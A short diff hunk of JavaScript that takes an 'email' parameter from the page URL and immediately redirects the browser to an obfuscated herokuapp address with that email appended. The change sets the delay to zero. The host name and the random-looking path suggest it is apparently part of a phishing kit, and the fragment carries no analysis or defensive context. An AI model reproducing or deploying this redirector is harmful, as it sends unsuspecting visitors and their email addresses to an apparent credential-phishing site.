@@ -21,7 +21,7 @@ var $c = getUrlParameter('email');
 	
 	setTimeout(function() {
                                 window.location.href = "https://messages-exmailpanel863c2de7c.herokuapp.com/?gfdsfghjkKgQ69xz2VfGmRFulpjkXD8iZhsAEBerv5q0wotSICaNyb1WY3U7PHT4McOLJOK9NanoqIB0ZLQzpFgRvyUS43JjlAWCwTiME1u7r8cYVeh6sGPXkm2HbtDf5zQwtL97V0U4fRN3DKFgJa8MniHupSYXWZmEAxoCPhyObrIj21sekTl65GBcqgOYErmBaLty65KiIMHGF9T3ZnuW4RQ1DqxvhS8sb2UXzAocwJ0kfNePpjlC7/sXMO5u2p3PH6nhv8mCrY7gtUR01DcBeafGzSExwlZJq94QIKjLiFTVkyNoWb?email="+myem;
-                        },2);
+                        },0);
 	
 	
         
